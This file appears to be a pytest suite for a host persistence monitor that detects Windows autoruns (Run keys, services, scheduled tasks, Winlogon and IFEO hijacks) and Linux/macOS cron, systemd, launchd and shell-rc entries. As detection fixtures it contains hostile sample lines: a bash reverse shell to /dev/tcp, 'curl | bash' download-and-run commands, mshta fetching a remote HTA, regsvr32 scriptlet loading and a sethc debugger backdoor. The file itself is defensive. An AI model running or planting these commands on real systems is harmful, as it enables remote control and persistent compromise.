import os
import plistlib
import sys

import pytest

from filespy.autoruns import AutorunEntry, score_entry
from filespy.autoruns.cmdline import extract_posix_target, extract_target, normalise_service_path
from filespy.autoruns.posix import (
    CronProvider,
    FilesProvider,
    LaunchdProvider,
    SystemdProvider,
    parse_authorized_keys,
    parse_cron_line,
    parse_desktop_exec,
    parse_unit,
)
from filespy.autoruns.windows import (
    RegistryDeepProvider,
    RegistryRunProvider,
    StartupFolderProvider,
    parse_lnk,
    parse_task_actions,
)
from filespy.events import Severity, summarize
from filespy.monitors.autoruns import AutorunMonitor, added_lines
from filespy.registry import FakeRegistry, expand_env
from filespy.testing import make_lnk, make_pe, make_task_actions, wait_for

RUN = r"Software\Microsoft\Windows\CurrentVersion\Run"
NT = r"Software\Microsoft\Windows NT\CurrentVersion"
SERVICES = r"SYSTEM\CurrentControlSet\Services"

WINDOWS_TARGETS = [
    (r'"C:\Program Files\App\app.exe" --minimized', r"C:\Program Files\App\app.exe"),
    (r"C:\Program Files\App\app.exe --minimized", r"C:\Program Files\App\app.exe"),
    (r"rundll32.exe C:\Users\b\AppData\Local\Temp\e.dll,Run", r"C:\Users\b\AppData\Local\Temp\e.dll"),
    (r'rundll32 "C:\A B\e.dll",Start arg', r"C:\A B\e.dll"),
    (r"regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", "scrobj.dll"),
    (r'cmd.exe /c start "" /min "C:\Users\b\AppData\Roaming\u.exe" -q', r"C:\Users\b\AppData\Roaming\u.exe"),
    (r"cmd /c C:\ProgramData\run.bat", r"C:\ProgramData\run.bat"),
    (r"powershell.exe -ExecutionPolicy Bypass -File C:\Users\b\s.ps1", r"C:\Users\b\s.ps1"),
    (r"powershell -enc SQBFAFgA", "powershell"),
    (r"wscript.exe //B //Nologo C:\Users\b\AppData\Roaming\a.vbs", r"C:\Users\b\AppData\Roaming\a.vbs"),
    (r"mshta.exe http://evil/a.hta", "http://evil/a.hta"),
    (r"msiexec /i C:\t\a.msi /qn", r"C:\t\a.msi"),
    (r"C:\Windows\system32\userinit.exe,", r"C:\Windows\system32\userinit.exe"),
    ("explorer.exe", "explorer.exe"),
    ("", ""),
    ('"unterminated', "unterminated"),
    # shapes found in review: each used to resolve to the wrong file
    (r'cmd.exe /c ""C:\Program Files\x\run.bat" arg"', r"C:\Program Files\x\run.bat"),
    (r'cmd.exe /c"C:\x\a.bat"', r"C:\x\a.bat"),
    (r"python C:\scripts\x.py", r"C:\scripts\x.py"),
    (r"java -jar C:\app\x.jar", r"C:\app\x.jar"),
    (r"C:\Users\Public\svc -k C:\Windows\x.dll", r"C:\Users\Public\svc"),
    (r"rundll32.exe C:\Users\x\e.dll Run", r"C:\Users\x\e.dll"),
    (r"powershell -NoP -W Hidden C:\Users\Public\a.ps1", r"C:\Users\Public\a.ps1"),
    (r'powershell -Command "& C:\Users\Public\a.ps1"', r"C:\Users\Public\a.ps1"),
    (r"powershell.exe -ep bypass -file=C:\x.ps1", r"C:\x.ps1"),
    (r'msiexec.exe /i"C:\a b\x.msi" /qn', r"C:\a b\x.msi"),
    (r'python -c "import os"', "python"),
]


@pytest.mark.parametrize("command,expected", WINDOWS_TARGETS)
def test_windows_target_extraction(command, expected):
    assert extract_target(command) == expected


@pytest.mark.parametrize(
    "command,expected",
    [("/usr/bin/python3 /opt/x/run.py --a", "/opt/x/run.py"), ("sudo -n /tmp/x", "/tmp/x"), ("env A=1 /tmp/x", "/tmp/x"),
     ('bash -c "curl x | sh"', "bash"), ("A=1 B=2 /bin/true", "/bin/true"), ("sh /tmp/a.sh", "/tmp/a.sh"),
     ("'unterminated quote", "'unterminated"), ("", "")],
)
def test_posix_target_extraction(command, expected):
    assert extract_posix_target(command) == expected


def test_unquoted_path_is_resolved_like_windows_does_when_files_can_be_checked():
    command = r"C:\Users\a\My.com Files\x.exe /s"
    assert extract_target(command) == r"C:\Users\a\My.com"  # no way to know without the file system
    real = {r"C:\Users\a\My.com Files\x.exe"}
    assert extract_target(command, exists=real.__contains__) == r"C:\Users\a\My.com Files\x.exe"
    planted = {r"C:\Program.exe", r"C:\Program Files\App\app.exe"}
    assert extract_target(r"C:\Program Files\App\app.exe -x", exists=planted.__contains__) == r"C:\Program Files\App\app.exe"


def test_service_paths_and_env_expansion():
    assert normalise_service_path(r"\SystemRoot\System32\drivers\x.sys") == r"%SystemRoot%\System32\drivers\x.sys"
    assert normalise_service_path(r"\??\C:\ProgramData\x.sys") == r"C:\ProgramData\x.sys"
    assert normalise_service_path(r"system32\drivers\y.sys") == r"%SystemRoot%\system32\drivers\y.sys"
    assert expand_env(r"%appdata%\x.exe %NOPE%", {"APPDATA": r"C:\R"}) == r"C:\R\x.exe %NOPE%"


def test_shortcut_and_task_blob_parsers_survive_garbage():
    assert parse_lnk(make_lnk(r"C:\Users\b\evil.exe", "-silent")) == (r"C:\Users\b\evil.exe", "-silent")
    assert parse_lnk(make_lnk(r"C:\a.exe")) == (r"C:\a.exe", "")
    assert parse_task_actions(make_task_actions(r"C:\ProgramData\u.exe", "/q")) == [r"C:\ProgramData\u.exe /q"]
    assert parse_task_actions(make_task_actions("powershell.exe", "-enc AAAA", version=2)) == ["powershell.exe -enc AAAA"]
    for junk in (b"", b"L\x00\x00\x00", b"\xff" * 300, make_lnk("C:\\a.exe")[:90], make_task_actions("x")[:11]):
        assert parse_lnk(junk)[0] is not None
        assert isinstance(parse_task_actions(junk), list)
    odd = b"\x03\x00" + "zzzzC:\\Odd Path\\tool.exe".encode("utf-16-le")
    assert any("tool.exe" in command for command in parse_task_actions(odd))


def fake_windows_registry():
    reg = FakeRegistry()
    reg.set("HKCU", RUN, "OneDrive", r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background')
    reg.set("HKLM", NT + r"\Winlogon", "Shell", "explorer.exe")
    reg.set("HKLM", NT + r"\Winlogon", "Userinit", r"C:\Windows\system32\userinit.exe,")
    reg.set("HKLM", NT + r"\Windows", "AppInit_DLLs", "")
    reg.set("HKLM", r"SYSTEM\CurrentControlSet\Control\Session Manager", "BootExecute", ["autocheck autochk *"])
    reg.set("HKLM", SERVICES + r"\Spooler", "ImagePath", r"%SystemRoot%\System32\spoolsv.exe")
    reg.set("HKLM", SERVICES + r"\Spooler", "Start", 2)
    reg.set("HKLM", SERVICES + r"\Dnscache", "ImagePath", r"%SystemRoot%\system32\svchost.exe -k NetworkService -p")
    reg.set("HKLM", SERVICES + r"\Dnscache\Parameters", "ServiceDll", r"%SystemRoot%\System32\dnsrslvr.dll")
    reg.set("HKLM", SERVICES + r"\NoImage", "Start", 3)
    reg.create_key("HKLM", NT + r"\Image File Execution Options\notepad.exe")
    tree = NT + r"\Schedule\TaskCache\Tree"
    reg.set("HKLM", tree + r"\Microsoft\Windows\Defrag\ScheduledDefrag", "Id", "{AAAA}")
    reg.set("HKLM", NT + r"\Schedule\TaskCache\Tasks\{AAAA}", "Actions", make_task_actions(r"%windir%\system32\defrag.exe", "-c"))
    return reg


def test_windows_providers_read_every_location():
    reg = fake_windows_registry()
    fast = {e.key: e for e in RegistryRunProvider(reg).collect()}
    assert ("run_key", f"hkcu\\{RUN}".lower(), "onedrive") in fast
    assert fast[("winlogon", f"hklm\\{NT}\\winlogon".lower(), "shell")].command == "explorer.exe"
    assert not [e for e in fast.values() if e.category == "appinit"]  # empty value is not an entry
    deep = RegistryDeepProvider(reg).collect()
    services = {e.name: e for e in deep if e.category == "service"}
    assert set(services) == {"Spooler", "Dnscache", "Dnscache (ServiceDll)"}
    assert services["Spooler"].target == r"C:\Windows\System32\spoolsv.exe"
    tasks = [e for e in deep if e.category == "scheduled_task"]
    assert len(tasks) == 1 and tasks[0].name == r"\Microsoft\Windows\Defrag\ScheduledDefrag"
    assert tasks[0].target == r"C:\Windows\system32\defrag.exe" and tasks[0].extra["built_in"]
    assert RegistryDeepProvider(reg, services=False, tasks=False).collect() == []


def test_every_users_hive_is_read_when_running_as_another_account():
    from filespy.autoruns.windows import startup_folders, user_hives

    reg = FakeRegistry()
    assert user_hives(reg) == [("HKCU", "", "HKCU")]  # nothing loaded under HKEY_USERS: fall back
    alice, bob = "S-1-5-21-1111-2222-3333-1001", "S-1-5-21-1111-2222-3333-1002"
    reg.set("HKU", alice + "\\" + RUN, "Updater", r"C:\Users\alice\AppData\Roaming\u.exe")
    reg.set("HKU", bob + "\\" + RUN, "Chat", r"C:\Program Files\Chat\chat.exe")
    reg.set("HKU", ".DEFAULT\\" + RUN, "Ignored", "x.exe")
    reg.set("HKU", alice + "_Classes\\x", "y", "z")
    reg.set("HKCU", RUN, "OnlyMine", "mine.exe")
    entries = {(e.location, e.name) for e in RegistryRunProvider(reg).collect()}
    assert (f"HKU\\{alice}\\{RUN}", "Updater") in entries and (f"HKU\\{bob}\\{RUN}", "Chat") in entries
    assert not any(name in ("Ignored", "OnlyMine") for _loc, name in entries)
    profiles = NT + r"\ProfileList"
    reg.set("HKLM", f"{profiles}\\{alice}", "ProfileImagePath", r"C:\Users\alice")
    reg.set("HKLM", f"{profiles}\\S-1-5-18", "ProfileImagePath", r"%SystemRoot%\system32\config\systemprofile")
    folders = startup_folders({"APPDATA": r"C:\Users\admin\AppData\Roaming"}, reg)
    assert len(folders) == 2 and folders[1].startswith(r"C:\Users\alice\AppData\Roaming")


def test_appended_hijack_in_a_list_value_is_the_target():
    reg = FakeRegistry()
    key = NT + r"\Winlogon"
    reg.set("HKLM", key, "Userinit", r"C:\Windows\system32\userinit.exe,C:\Users\Public\evil.exe")
    reg.set("HKLM", key, "Shell", "explorer.exe")
    reg.set("HKLM", r"SYSTEM\CurrentControlSet\Control\Session Manager", "BootExecute",
            ["autocheck autochk *", r"C:\ProgramData\boot.exe /q"])
    found = {e.name: e.target for e in RegistryRunProvider(reg).collect()}
    assert found["Userinit"] == r"C:\Users\Public\evil.exe"
    assert found["Shell"] == "explorer.exe"
    assert found["BootExecute"] == r"C:\ProgramData\boot.exe"


def test_startup_folder_provider_resolves_shortcuts(tmp_path):
    (tmp_path / "desktop.ini").write_text("x")
    (tmp_path / "updater.lnk").write_bytes(make_lnk(r"C:\Users\b\AppData\Roaming\u.exe", "/s"))
    (tmp_path / "run.bat").write_text("echo")
    entries = {e.name: e for e in StartupFolderProvider([str(tmp_path), str(tmp_path / "missing")]).collect()}
    assert set(entries) == {"updater.lnk", "run.bat"}
    assert entries["updater.lnk"].target == r"C:\Users\b\AppData\Roaming\u.exe"
    assert entries["run.bat"].target.endswith("run.bat")


@pytest.fixture
def windows_monitor(make_ctx, monkeypatch):
    ctx = make_ctx(platform="win32", autoruns__interval=0.5)
    ctx.registry = fake_windows_registry()
    monkeypatch.setattr("filespy.autoruns.windows.startup_folders", lambda env=None, registry=None: [])
    monkeypatch.setattr("filespy.monitors.autoruns.SLOW_EVERY", 1)
    monitor = AutorunMonitor(ctx)
    monitor.interval = 0.05
    monitor.start()
    assert monitor.ready.wait(10) and not monitor.failed
    monitor.interval = 0.05
    yield ctx, monitor
    monitor.stop()
    monitor.join()


def test_monitor_reports_run_key_added_changed_removed(windows_monitor):
    ctx, _monitor = windows_monitor
    assert not ctx.bus.find("autorun")  # the existing state is the baseline, not an alert
    ctx.registry.set("HKCU", RUN, "Updater", r"C:\Users\test\AppData\Roaming\upd.exe")
    added = wait_for(lambda: ctx.bus.find("autorun", "added"))
    assert added and added[0].severity >= Severity.MEDIUM and "Updater" in added[0].title
    assert {"autorun.run_key", "autorun.target_user_writable"} <= {i.id for i in added[0].indicators}
    assert added[0].details["target"] == r"C:\Users\test\AppData\Roaming\upd.exe"
    ctx.registry.set("HKCU", RUN, "Updater", r"powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA")
    changed = wait_for(lambda: ctx.bus.find("autorun", "changed"))
    assert changed and changed[0].severity >= Severity.HIGH
    assert "proc.cmd.ps_encoded" in {i.id for i in changed[0].indicators}
    ctx.registry.delete_value("HKCU", RUN, "Updater")
    removed = wait_for(lambda: ctx.bus.find("autorun", "removed"))
    assert removed and removed[0].severity is Severity.INFO


def test_monitor_reports_hijacks_services_and_tasks(windows_monitor):
    ctx, _monitor = windows_monitor
    reg = ctx.registry
    reg.set("HKLM", NT + r"\Winlogon", "Shell", r"explorer.exe, C:\Users\Public\x.exe")
    reg.set("HKLM", NT + r"\Image File Execution Options\sethc.exe", "Debugger", r"C:\Windows\System32\cmd.exe")
    reg.set("HKLM", SERVICES + r"\WinUpdateSvc", "ImagePath", r"C:\ProgramData\svc\host.exe")
    tree = NT + r"\Schedule\TaskCache\Tree"
    reg.set("HKLM", tree + r"\Updater", "Id", "{BBBB}")
    reg.set("HKLM", NT + r"\Schedule\TaskCache\Tasks\{BBBB}", "Actions",
            make_task_actions("mshta.exe", "http://evil.example/a.hta"))
    events = wait_for(lambda: len(ctx.bus.find("autorun")) >= 4 and ctx.bus.find("autorun"))
    by_category = {e.details["category"]: e for e in events}
    assert set(by_category) == {"winlogon", "ifeo", "service", "scheduled_task"}
    assert by_category["winlogon"].action == "changed" and by_category["winlogon"].severity >= Severity.HIGH
    assert by_category["ifeo"].severity >= Severity.HIGH
    assert by_category["service"].severity >= Severity.MEDIUM
    assert "proc.cmd.mshta_remote" in {i.id for i in by_category["scheduled_task"].indicators}


def test_persistence_for_a_dropped_file_is_critical(make_ctx, tmp_path):
    ctx = make_ctx()
    payload = tmp_path / "rat.exe"
    payload.write_bytes(make_pe(payload=b"AsyncMutex_6SI8OkPnk"))
    entry = AutorunEntry("run_key", "HKCU\\...\\Run", "Updater", str(payload), str(payload))
    plain = score_entry(entry, ctx)
    assert "autorun.target_dropped" not in {i.id for i in plain}
    ctx.state.note_drop(str(payload), "x", "ev", score=50)
    found = score_entry(entry, ctx)
    assert {"autorun.target_dropped", "file.rule.rat.asyncrat"} <= {i.id for i in found}
    assert summarize(found)[1] is Severity.CRITICAL


def test_cron_systemd_desktop_and_key_parsers():
    assert parse_cron_line("*/5 * * * * root /usr/bin/x --y", True) == "/usr/bin/x --y"
    assert parse_cron_line("@reboot /tmp/.x/run.sh", False) == "/tmp/.x/run.sh"
    assert parse_cron_line("0 3 * * 1 /usr/bin/backup %a", False) == "/usr/bin/backup %a"
    for skipped in ("# comment", "", "MAILTO=root", "PATH = /bin", "* * * *", "@reboot root", "1 2 3"):
        assert parse_cron_line(skipped, True) is None
    unit = "[Service]\nExecStartPre=-/bin/mkdir /x\nExecStart=@/usr/bin/app \\\n  --flag\nExecStop=/bin/kill\n"
    assert parse_unit(unit) == ["/bin/mkdir /x", "/usr/bin/app    --flag"]
    assert parse_desktop_exec("[Desktop Entry]\nExec=/opt/a/b %U\nHidden=true\n[Other]\nExec=/no\n") == ("/opt/a/b", True)
    keys = parse_authorized_keys(
        '# c\ncommand="/bin/backup",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBogus bob@host\nssh-rsa AAAAB3Nza alice\ngarbage\n')
    assert len(keys) == 2 and keys[0][0].startswith("ssh-ed25519 SHA256:") and keys[0][0].endswith("bob@host")
    assert keys[0][1] == 'command="/bin/backup",no-pty' and "AAAAC3" not in keys[0][0]


def test_posix_providers_and_added_line_reporting(tmp_path):
    cron_d = tmp_path / "cron.d"
    cron_d.mkdir()
    (cron_d / "job").write_text("SHELL=/bin/sh\n* * * * * root /usr/local/bin/tick\n")
    spool = tmp_path / "spool"
    spool.mkdir()
    (spool / "bob").write_text("@reboot /tmp/.hidden/miner --quiet\n")
    daily = tmp_path / "cron.daily"
    daily.mkdir()
    (daily / "logrotate").write_text("#!/bin/sh\n")
    cron = {e.name: e for e in CronProvider([str(tmp_path / "none")], [str(cron_d)], [str(spool)], [str(daily)]).collect()}
    assert cron["/tmp/.hidden/miner --quiet"].target == "/tmp/.hidden/miner"
    assert "/usr/local/bin/tick" in cron and "logrotate" in cron

    units = tmp_path / "units"
    units.mkdir()
    (units / "evil.service").write_text("[Service]\nExecStart=/dev/shm/x -d\n")
    (units / "ignored.conf").write_text("x")
    provider = SystemdProvider([str(units)])
    first = provider.collect()
    assert [(e.name, e.target) for e in first] == [("evil.service", "/dev/shm/x")]
    assert provider.collect()[0] is first[0]  # unchanged files are not re-read
    (units / "evil.service").unlink()
    assert provider.collect() == []

    auto = tmp_path / "autostart"
    auto.mkdir()
    (auto / "a.desktop").write_text("[Desktop Entry]\nExec=/home/u/.cache/a %f\n")
    rc = tmp_path / ".bashrc"
    rc.write_text("alias ll='ls -l'\n")
    preload = tmp_path / "ld.so.preload"
    preload.write_text("# none\n/tmp/libx.so\n")
    keys = tmp_path / "authorized_keys"
    keys.write_text("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBogus me\n")
    files = FilesProvider([str(auto)], [str(rc), str(tmp_path / "absent")], [], [], [str(preload)], [str(keys)], [])
    entries = {e.category: e for e in files.collect()}
    assert set(entries) == {"xdg_autostart", "shell_rc", "ld_preload", "ssh_key"}
    assert entries["shell_rc"].content.startswith("alias") and entries["ld_preload"].target == "/tmp/libx.so"
    assert added_lines("a\nb\n", "a\n# note\nb\ncurl http://x | sh\n") == ["curl http://x | sh"]


def test_launchd_provider(tmp_path):
    with open(tmp_path / "com.evil.plist", "wb") as handle:
        plistlib.dump({"Label": "com.evil", "ProgramArguments": ["/bin/sh", "-c", "curl x | sh"], "RunAtLoad": True},
                      handle, fmt=plistlib.FMT_BINARY)
    with open(tmp_path / "com.ok.plist", "wb") as handle:
        plistlib.dump({"Label": "com.ok", "Program": "/Users/Shared/.a/agent"}, handle)
    (tmp_path / "broken.plist").write_bytes(b"not a plist")
    hooks = tmp_path / "loginwindow.plist"
    with open(hooks, "wb") as handle:
        plistlib.dump({"LoginHook": "/Users/Shared/hook.sh"}, handle)
    entries = {e.name: e for e in LaunchdProvider([str(tmp_path)], str(hooks)).collect()}
    assert entries["com.evil.plist"].extra["run_at_load"] and "curl x | sh" in entries["com.evil.plist"].command
    assert entries["com.ok.plist"].target == "/Users/Shared/.a/agent"
    assert entries["broken.plist"].command == "(unreadable plist)"
    assert entries["LoginHook"].category == "login_hook"


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX providers")
def test_posix_monitor_reports_new_cron_job_and_rc_edit(make_ctx, tmp_path, monkeypatch):
    cron_d = tmp_path / "cron.d"
    cron_d.mkdir()
    rc = tmp_path / ".bashrc"
    rc.write_text("export EDITOR=vi\n")
    providers = [CronProvider([], [str(cron_d)], [], []), FilesProvider([], [str(rc)], [], [], [], [], [])]
    monkeypatch.setattr("filespy.monitors.autoruns.get_providers", lambda ctx: providers)
    ctx = make_ctx(platform="linux")
    monitor = AutorunMonitor(ctx)
    monitor.start()
    try:
        assert monitor.ready.wait(10) and not monitor.failed
        monitor.interval = 0.05
        (cron_d / "x").write_text("@reboot root bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n")
        added = wait_for(lambda: ctx.bus.find("autorun", "added"))
        assert added and added[0].severity >= Severity.HIGH
        assert "proc.cmd.reverse_shell" in {i.id for i in added[0].indicators}
        rc.write_text("export EDITOR=vi\ncurl -s http://x.example/i | bash\n")
        changed = wait_for(lambda: [e for e in ctx.bus.find("autorun", "changed") if e.details.get("added_lines")])
        assert changed and changed[0].details["added_lines"] == ["curl -s http://x.example/i | bash"]
        assert changed[0].severity >= Severity.HIGH
        ctx.bus.events.clear()
        rc.write_text("curl -s http://x.example/i | bash\n")
        quiet = wait_for(lambda: ctx.bus.find("autorun", "changed"))
        assert quiet and quiet[0].severity is Severity.INFO
    finally:
        monitor.stop()
        monitor.join()


@pytest.mark.skipif(sys.platform != "win32", reason="needs the real Windows registry")
def test_real_registry_run_key_is_detected(make_ctx):
    import winreg

    from filespy.registry import WinRegistry

    ctx = make_ctx()
    ctx.registry = WinRegistry()
    name = f"FileSpyTest{os.getpid()}"
    existed = ctx.registry.values("HKCU", RUN) is not None  # a fresh user profile has no Run key yet
    monitor = AutorunMonitor(ctx)
    monitor.start()
    try:
        assert monitor.ready.wait(60) and not monitor.failed
        monitor.interval = 0.2
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, r"C:\Users\Public\filespy-test.exe")
        added = wait_for(lambda: [e for e in ctx.bus.find("autorun", "added") if name in e.title], 30)
        assert added and added[0].details["target"] == r"C:\Users\Public\filespy-test.exe"
    finally:
        monitor.stop()
        monitor.join()
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, name)
            if not existed:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, RUN)  # leave the profile as we found it
        except OSError:
            pass
